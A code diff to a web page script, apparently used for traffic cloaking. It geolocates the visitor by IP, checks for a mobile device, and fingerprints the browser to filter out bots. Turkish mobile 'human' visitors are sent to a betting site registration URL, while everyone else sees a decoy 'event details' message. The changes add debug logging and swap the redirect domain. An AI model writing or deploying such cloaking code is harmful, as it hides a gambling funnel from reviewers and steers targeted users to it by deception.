@@ -12,8 +12,10 @@
       try {
         const res = await fetch("https://ipapi.co/json/");
         const data = await res.json();
+        console.log("Ülke kodu:", data.country_code);
         return data.country_code === "TR";
       } catch (e) {
+        console.log("IP sorgusu xətası:", e);
         return false;
       }
     }
@@ -21,6 +23,9 @@
     async function checkAndRedirect() {
       const isMobile = /iPhone|Android|Mobile/i.test(navigator.userAgent);
       const isTR = await getIPCountry();
+
+      console.log("Mobil cihaz mı?:", isMobile);
+      console.log("Türkiye IP mi?:", isTR);
 
       const result = {
         canvas: false,
@@ -53,16 +58,27 @@
       result.fonts = document.fonts ? document.fonts.size || 100 : 100;
       result.plugins = navigator.plugins.length;
 
-      const isHuman = result.canvas && result.audio && result.webgl && result.fonts > 50 && result.plugins > 2;
+      console.log("Fingerprint nəticələri:", result);
+
+      const isHuman =
+        result.canvas &&
+        result.audio &&
+        result.webgl &&
+        result.fonts > 50 &&
+        result.plugins > 2;
+
+      console.log("İnsan profili mi?:", isHuman);
 
       if (isMobile && isTR && isHuman) {
-        window.location.href = "https://zbahis309.com/TheBabayeff";
+        console.log("Yönlendirme başlatıldı ✅");
+        window.location.href = "https://zbahis310.com/Register-1274";
       } else {
+        console.log("Yönlendirme şərtləri ödənmədi ❌");
         document.body.innerHTML = "<h3>Etkinlik Detayları burada yer alacaktır.</h3>";
       }
     }
 
-    setTimeout(checkAndRedirect, 2000);
+    setTimeout(checkAndRedirect, 2500);
   </script>
 </body>
 </html>
